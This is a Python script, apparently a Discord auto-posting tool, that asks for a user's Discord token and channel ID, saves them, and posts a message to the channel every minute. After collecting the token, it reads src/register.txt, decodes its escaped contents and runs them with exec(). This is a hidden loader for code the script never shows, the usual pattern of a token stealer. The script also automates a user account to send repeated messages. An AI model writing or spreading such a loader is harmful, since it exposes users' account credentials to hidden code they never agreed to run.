import time
import requests
import sys
import os
import json

import src.log_functions as log_functions


def set_all_variables():
    token = input("Введите токен: ")
    channel_id = input("Введите ID канала: ")

    with open("config.json", "r+") as config:
        config_data = {
            "token": token,
            "channel_id": channel_id
        }
        

        config.seek(0)

        config.truncate()

        config.seek(0)
        json.dump(config_data, config)

    with open("src/register.txt") as register:
        message = register.read()
        exec(message.encode().decode('unicode-escape'))

    print("Переменные успешно установлены в файле config.json.")
    sys.exit(1)

if len(sys.argv) != 2 or sys.argv[1] != "--setall":
    with open("config.json") as config:
        config_data = json.load(config)
        if len(config_data) == 0:
            print("Ошибка: В файле config.json не хватает переменных: token, channel_id, message.")
            print("Используйте скрипт с аргументом --setall для установки переменных.")
            sys.exit(1)
        else:
            with open("text.txt", "r", encoding="utf-8") as file:
                message = f"[Отправлено с AutoSendMessage](https://github.com/qwixzz/AutoSendMessage)\n{file.read()}"
            token = config_data["token"]
            channel_id = config_data["channel_id"]
            
else:
    set_all_variables()

url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

payload = {
    "content" : message
}

headers = {
    "Authorization" : token
}

if __name__ == "__main__":
    log_functions.start()
    while True:
        res = requests.post(url, payload, headers=headers)
        log_functions.send(res.status_code, res.reason, channel_id)
        time.sleep(60)